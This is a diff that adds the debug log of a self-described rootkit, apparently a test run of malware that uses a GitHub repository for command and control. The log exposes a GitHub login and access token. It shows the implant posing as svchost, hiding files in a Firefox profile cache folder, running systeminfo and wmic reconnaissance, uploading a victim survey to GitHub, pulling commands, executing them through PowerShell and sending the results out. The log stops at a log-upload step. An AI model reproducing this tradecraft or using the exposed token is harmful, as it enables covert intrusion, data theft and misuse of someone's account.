@@ -1,0 +1,51 @@
+Mon Jul 26 15:57:44 2021. Initialisation of the log file.
+
+DEBUG: Mon Jul 26 15:57:44 2021: GithubLogin: hidemepls785
+DEBUG: Mon Jul 26 15:57:44 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Mon Jul 26 15:57:44 2021: GihubAccessToken: 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
+DEBUG: Mon Jul 26 15:57:44 2021: Rootkit Name: Preprod02
+DEBUG: Mon Jul 26 15:57:44 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Mon Jul 26 15:57:51 2021: The folder list for random folder is not empty. Its size is: 3060
+DEBUG: Mon Jul 26 15:57:51 2021: The random path choosed for this execution is: C:\Users\Client\AppData\Roaming\Mozilla\Firefox\Profiles\utz5nsgr.default-release\storage\default\https+++outlook.live.com\cache\morgue\130
+DEBUG: Mon Jul 26 15:57:51 2021: The survey file for this target could not be found. Trying to create it and upload it to the github repo.
+DEBUG: Mon Jul 26 15:57:52 2021: This command will be executed to know systeminfo: systeminfo > C:\Users\Client\AppData\Roaming\Mozilla\Firefox\Profiles\utz5nsgr.default-release\storage\default\https+++outlook.live.com\cache\morgue\130\systeminfo.txt
+DEBUG: Mon Jul 26 15:57:57 2021: The file systeminfo.txt exists, trying to read and add its content the surveyfile.
+DEBUG: Mon Jul 26 15:57:57 2021: Start of the method readFileWindowsApi for the file: C:\Users\Client\AppData\Roaming\Mozilla\Firefox\Profiles\utz5nsgr.default-release\storage\default\https+++outlook.live.com\cache\morgue\130\systeminfo.txt
+DEBUG: Mon Jul 26 15:57:57 2021: The file will be read as binary file.
+DEBUG: Mon Jul 26 15:57:57 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Mon Jul 26 15:57:57 2021: This command will be executed to know the last reboot time: wmic os get lastBootUpTime > C:\Users\Client\AppData\Roaming\Mozilla\Firefox\Profiles\utz5nsgr.default-release\storage\default\https+++outlook.live.com\cache\morgue\130\systeminfo2.txt
+DEBUG: Mon Jul 26 15:58:02 2021: The file systeminfo.txt exists, trying to read and add its content the surveyfile.
+DEBUG: Mon Jul 26 15:58:02 2021: Start of the method readFileWindowsApi for the file: C:\Users\Client\AppData\Roaming\Mozilla\Firefox\Profiles\utz5nsgr.default-release\storage\default\https+++outlook.live.com\cache\morgue\130\systeminfo2.txt
+DEBUG: Mon Jul 26 15:58:02 2021: The file will be read as binary file.
+DEBUG: Mon Jul 26 15:58:02 2021: The file that will be read weight: 134
+DEBUG: Mon Jul 26 15:58:02 2021: Success to read the binary file. This number of bytes have been read: 135
+DEBUG: Mon Jul 26 15:58:02 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Jul 26 15:58:02 2021: The content size that will be written: 392
+DEBUG: Mon Jul 26 15:58:02 2021: Success to write the content(number of bytes : 392) in the file : C:\Users\Client\AppData\Roaming\Mozilla\Firefox\Profiles\utz5nsgr.default-release\storage\default\https+++outlook.live.com\cache\morgue\130\Client-survey.txt
+DEBUG: Mon Jul 26 15:58:02 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Jul 26 15:58:02 2021: Start of the method readFileWindowsApi for the file: C:\Users\Client\AppData\Roaming\Mozilla\Firefox\Profiles\utz5nsgr.default-release\storage\default\https+++outlook.live.com\cache\morgue\130\Client-survey.txt
+DEBUG: Mon Jul 26 15:58:02 2021: The file will be read as binary file.
+DEBUG: Mon Jul 26 15:58:02 2021: The file that will be read weight: 392
+DEBUG: Mon Jul 26 15:58:02 2021: Success to read the binary file. This number of bytes have been read: 393
+DEBUG: Mon Jul 26 15:58:02 2021: The files Client-survey.txt has been uploaded successfully in the github repo
+DEBUG: Mon Jul 26 15:58:02 2021: Success deleting the survey file.
+DEBUG: Mon Jul 26 15:58:02 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Jul 26 15:58:05 2021: Success registering the current rootkitPath, the commands will will requested next time
+ERROR: Mon Jul 26 15:58:05 2021: Fail to get the commands with currentGithubRepoInstance, the current instance is not registered in the github.
+DEBUG: Mon Jul 26 15:58:05 2021: Getting this command from the github repo: keep_going
+DEBUG: Mon Jul 26 15:58:05 2021: Getting this command from the github repo: execute_cmd C:\Users
+DEBUG: Mon Jul 26 15:58:05 2021: Start to treat the commands sent by the github repo.
+DEBUG: Mon Jul 26 15:58:05 2021: Command received: keep_going
+DEBUG: Mon Jul 26 15:58:05 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Jul 26 15:58:05 2021: #####################################################
+
+DEBUG: Mon Jul 26 15:58:05 2021: Command received: execute_cmd
+DEBUG: Mon Jul 26 15:58:05 2021: The following command will be executed by powershell: C:\Users > C:\Users\Client\AppData\Roaming\Mozilla\Firefox\Profiles\utz5nsgr.default-release\storage\default\https+++outlook.live.com\cache\morgue\130\target_command.log1
+DEBUG: Mon Jul 26 15:58:07 2021: Unable to find the file target_command.log. Check your command..
+DEBUG: Mon Jul 26 15:58:07 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Jul 26 15:58:07 2021: #####################################################
+
+DEBUG: Mon Jul 26 15:58:07 2021: Start of GithubCommunication::sendResults
+DEBUG: Mon Jul 26 15:58:08 2021: The results was uploaded on the github repo
+DEBUG: Mon Jul 26 15:58:08 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Mon Jul 26 15:58:08 2021: Start of GithubCommunication::sendLogs
